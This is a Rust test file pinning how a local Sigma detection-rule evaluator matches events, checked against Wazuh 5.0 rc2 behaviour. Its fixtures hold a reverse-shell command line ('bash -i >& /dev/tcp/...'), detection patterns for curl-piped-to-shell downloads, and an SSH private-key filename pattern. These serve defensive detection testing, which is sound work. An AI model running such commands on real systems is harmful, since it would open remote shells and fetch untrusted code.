//! Semantics of the local evaluator.
//!
//! Each case pins a behaviour of the Wazuh 5.0 rc2 detection path (Content
//! Manager logtest / Security Analytics percolator). Where Wazuh departs from
//! the Sigma specification, the test says so. The parity suite
//! (`tests/wazuh_parity.rs`) re-checks every rule fixture against a real rc2
//! indexer, so a drift here fails CI there.

use serde_json::json;
use wazuh_dac::evaluate::matches;
use wazuh_dac::sigma::{Error, Rule};

fn rule(detection: &str) -> Rule {
    try_rule(detection).expect("rule parses")
}

fn try_rule(detection: &str) -> Result<Rule, Error> {
    Rule::from_yaml(&format!(
        "title: t\nlogsource: {{product: linux}}\ndetection:\n{detection}"
    ))
}

#[test]
fn field_dictionary_is_and() {
    let r = rule("  sel: {event.action: a, user.name: b}\n  condition: sel");
    assert!(matches(
        &r,
        &json!({"event": {"action": "a"}, "user": {"name": "b"}})
    ));
    assert!(!matches(
        &r,
        &json!({"event": {"action": "a"}, "user": {"name": "c"}})
    ));
}

#[test]
fn list_of_dictionaries_is_or() {
    let r = rule("  sel:\n    - {event.action: a}\n    - {user.name: b}\n  condition: sel");
    assert!(matches(&r, &json!({"user": {"name": "b"}})));
    assert!(!matches(&r, &json!({"user": {"name": "c"}})));
}

#[test]
fn flat_dotted_keys_are_accepted_as_well_as_nested() {
    let r = rule("  sel: {event.action: a}\n  condition: sel");
    assert!(matches(&r, &json!({"event.action": "a"})));
}

#[test]
fn value_list_is_or() {
    let r = rule("  sel: {event.action: [a, b]}\n  condition: sel");
    assert!(matches(&r, &json!({"event": {"action": "b"}})));
    assert!(!matches(&r, &json!({"event": {"action": "c"}})));
}

#[test]
fn plain_equality_is_case_sensitive_unlike_sigma_spec() {
    // Sigma spec: case-insensitive. Wazuh 5.0: case-sensitive (verified on rc2).
    let r = rule("  sel: {process.name: useradd}\n  condition: sel");
    assert!(matches(&r, &json!({"process": {"name": "useradd"}})));
    assert!(!matches(&r, &json!({"process": {"name": "USERADD"}})));
}

#[test]
fn string_modifiers() {
    for (modifier, value, hit, miss) in [
        (
            "endswith",
            "useradd",
            "/usr/sbin/useradd",
            "/usr/sbin/useradd.bak",
        ),
        ("startswith", "/etc/cron", "/etc/cron.d/x", "/var/etc/cron"),
        (
            "contains",
            "/dev/tcp/",
            "bash -i >& /dev/tcp/1.2.3.4/4444",
            "bash -i",
        ),
    ] {
        let r = rule(&format!(
            "  sel: {{process.command_line|{modifier}: '{value}'}}\n  condition: sel"
        ));
        assert!(
            matches(&r, &json!({"process": {"command_line": hit}})),
            "{modifier} hit"
        );
        assert!(
            !matches(&r, &json!({"process": {"command_line": miss}})),
            "{modifier} miss"
        );
    }
}

#[test]
fn contains_is_case_sensitive() {
    let r = rule("  sel: {process.command_line|contains: Invoke}\n  condition: sel");
    assert!(!matches(
        &r,
        &json!({"process": {"command_line": "invoke-expression"}})
    ));
}

#[test]
fn plain_wildcards() {
    let r = rule("  sel: {file.name: 'id_?sa*'}\n  condition: sel");
    assert!(matches(&r, &json!({"file": {"name": "id_rsa.pub"}})));
    assert!(!matches(&r, &json!({"file": {"name": "id_ed25519"}})));
}

#[test]
fn escaped_wildcard_is_literal() {
    let r = rule(concat!(r"  sel: {file.name: 'a\*b'}", "\n  condition: sel"));
    assert!(matches(&r, &json!({"file": {"name": "a*b"}})));
    assert!(!matches(&r, &json!({"file": {"name": "axxb"}})));
}

#[test]
fn regex_special_chars_in_plain_values_are_literal() {
    let r = rule("  sel: {file.path: '/a.b'}\n  condition: sel");
    assert!(!matches(&r, &json!({"file": {"path": "/aXb"}})));
}

#[test]
fn contains_all_requires_every_value() {
    let r = rule("  sel:\n    process.command_line|contains|all: [curl, '| sh']\n  condition: sel");
    assert!(matches(
        &r,
        &json!({"process": {"command_line": "curl -s x | sh"}})
    ));
    assert!(!matches(
        &r,
        &json!({"process": {"command_line": "curl -s x"}})
    ));
}

#[test]
fn array_field_matches_if_any_element_matches() {
    let r = rule("  sel: {event.type: creation}\n  condition: sel");
    assert!(matches(
        &r,
        &json!({"event": {"type": ["user", "creation"]}})
    ));
    assert!(!matches(
        &r,
        &json!({"event": {"type": ["user", "deletion"]}})
    ));
}

#[test]
fn regex_is_unanchored_search() {
    // Verified on rc2: 'curl.*sh' matches 'x curl foo | sh y'.
    let r = rule("  sel: {process.command_line|re: 'curl.*sh'}\n  condition: sel");
    assert!(matches(
        &r,
        &json!({"process": {"command_line": "x curl foo | sh y"}})
    ));
    assert!(!matches(
        &r,
        &json!({"process": {"command_line": "wget foo"}})
    ));
}

#[test]
fn regex_anchors_at_the_ends_work() {
    // Verified on rc2: '^u' and 's$' match 'u+s' but not 'chmod u+s x'.
    for re in ["^u", "s$"] {
        let r = rule(&format!(
            "  sel: {{process.command_line|re: '{re}'}}\n  condition: sel"
        ));
        assert!(
            matches(&r, &json!({"process": {"command_line": "u+s"}})),
            "{re}"
        );
        assert!(
            !matches(&r, &json!({"process": {"command_line": "chmod u+s x"}})),
            "{re}"
        );
    }
}

#[test]
fn regex_character_classes_stand_in_for_escapes() {
    // Verified on rc2: 'u[+]s' and 'a[ ]b' work where 'u\+s' and 'a\sb' do not.
    let r = rule("  sel: {process.command_line|re: 'u[+]s[ ]x'}\n  condition: sel");
    assert!(matches(
        &r,
        &json!({"process": {"command_line": "chmod u+s x"}})
    ));
}

#[test]
fn regex_constructs_wazuh_misreads_are_rejected() {
    // rc2 compiles |re to a Lucene-style regex. Probed on rc2: `\+`, `\s`,
    // `\d` never match; `q\|r` matches plain "r" (over-fires); `$`/`^` inside
    // the pattern are literal; `a@b` matches "axb" (`@` = any string);
    // `a#b`, `a&b` don't match themselves; `<1-9>` matches "5"; `(?i)abc`
    // matches neither "abc" nor "ABC". `"` is rejected on Lucene's docs
    // (quoted literal strings); paired quotes were not probed.
    // `/` never matches in any form ('a/b', 'a[/]b', 'a\/b' all verified dead
    // on rc2) — consistent with a query_string `/regex/` delimiter.
    for re in [
        r"u\+s", r"q\|r", r"a\sb", r"\d{3}", "b(x|$)", "a^b", "a&b", "a@b", "<1-9>", "a#", "\"a\"",
        "(?i)a", "a/b", "a[/]b",
    ] {
        let yaml = format!("  sel:\n    process.command_line|re: '{re}'\n  condition: sel");
        assert!(
            matches!(try_rule(&yaml), Err(Error::Unsupported(_))),
            "{re} should be rejected"
        );
    }
}

#[test]
fn regex_tilde_is_literal_in_both_engines() {
    // Probed on rc2: 'a~b' matches "a~b" and not "axb".
    let r = rule("  sel: {process.command_line|re: 'a~b'}\n  condition: sel");
    assert!(matches(&r, &json!({"process": {"command_line": "a~b"}})));
    assert!(!matches(&r, &json!({"process": {"command_line": "axb"}})));
}

#[test]
fn regex_flags_are_rejected() {
    // rc2 rejects the rule: "Unknown modifier i".
    for flag in ["i", "m", "s"] {
        let yaml = format!("  sel: {{process.command_line|re|{flag}: a}}\n  condition: sel");
        assert!(
            matches!(try_rule(&yaml), Err(Error::Unsupported(_))),
            "{flag}"
        );
    }
}

#[test]
fn cidr() {
    let r = rule("  sel: {source.ip|cidr: 10.0.0.0/8}\n  condition: sel");
    assert!(matches(&r, &json!({"source": {"ip": "10.1.2.3"}})));
    assert!(!matches(&r, &json!({"source": {"ip": "192.168.1.1"}})));
    assert!(!matches(&r, &json!({"source": {"ip": "not-an-ip"}})));
}

#[test]
fn numeric_comparisons() {
    for (modifier, port, expected) in [
        ("gte", 4444, true),
        ("gte", 443, false),
        ("gt", 4444, false),
        ("lt", 443, true),
        ("lte", 4444, true),
    ] {
        let r = rule(&format!(
            "  sel: {{destination.port|{modifier}: 4444}}\n  condition: sel"
        ));
        assert_eq!(
            matches(&r, &json!({"destination": {"port": port}})),
            expected,
            "{modifier} {port}"
        );
    }
}

#[test]
fn numeric_equality_accepts_string_or_number_in_event() {
    let r = rule("  sel: {event.code: 1102}\n  condition: sel");
    assert!(matches(&r, &json!({"event": {"code": "1102"}})));
    assert!(matches(&r, &json!({"event": {"code": 1102}})));
}

#[test]
fn exists() {
    let r = rule(
        "  sel: {source.ip|exists: true}\n  absent: {user.name|exists: false}\n  condition: sel and absent",
    );
    assert!(matches(&r, &json!({"source": {"ip": "1.2.3.4"}})));
    assert!(!matches(
        &r,
        &json!({"source": {"ip": "1.2.3.4"}, "user": {"name": "x"}})
    ));
}

#[test]
fn missing_field_never_matches() {
    let r = rule("  sel: {user.name: root}\n  condition: sel");
    assert!(!matches(&r, &json!({})));
}

#[test]
fn condition_with_not_and_or_and_parentheses() {
    let r = rule(
        "  a: {event.action: x}\n  b: {event.action: y}\n  f: {user.name: ansible}\n  condition: (a or b) and not f",
    );
    assert!(matches(
        &r,
        &json!({"event": {"action": "y"}, "user": {"name": "mallory"}})
    ));
    assert!(!matches(
        &r,
        &json!({"event": {"action": "y"}, "user": {"name": "ansible"}})
    ));
    assert!(!matches(&r, &json!({"event": {"action": "z"}})));
}

#[test]
fn not_binds_tighter_than_and() {
    let r = rule("  a: {event.action: x}\n  f: {user.name: n}\n  condition: not f and a");
    assert!(matches(&r, &json!({"event": {"action": "x"}})));
}

#[test]
fn one_of_and_all_of_patterns() {
    let r = rule("  sel_a: {event.action: x}\n  sel_b: {user.name: y}\n  condition: 1 of sel_*");
    assert!(matches(&r, &json!({"user": {"name": "y"}})));
    let r = rule("  sel_a: {event.action: x}\n  sel_b: {user.name: y}\n  condition: all of them");
    assert!(!matches(&r, &json!({"user": {"name": "y"}})));
    assert!(matches(
        &r,
        &json!({"event": {"action": "x"}, "user": {"name": "y"}})
    ));
}

#[test]
fn keywords_are_rejected_at_parse_time() {
    // Wazuh's full-text keyword semantics are not modelled; refuse rather than guess.
    assert!(matches!(
        try_rule("  keywords: [DataError]\n  condition: keywords"),
        Err(Error::Unsupported(_))
    ));
}

#[test]
fn unknown_modifier_is_rejected() {
    assert!(matches!(
        try_rule("  sel: {process.command_line|base64offset|contains: x}\n  condition: sel"),
        Err(Error::Unsupported(_))
    ));
}

#[test]
fn condition_referencing_missing_selection_is_an_error() {
    assert!(matches!(
        try_rule("  sel: {event.action: x}\n  condition: sel and nope"),
        Err(Error::Invalid(_))
    ));
}
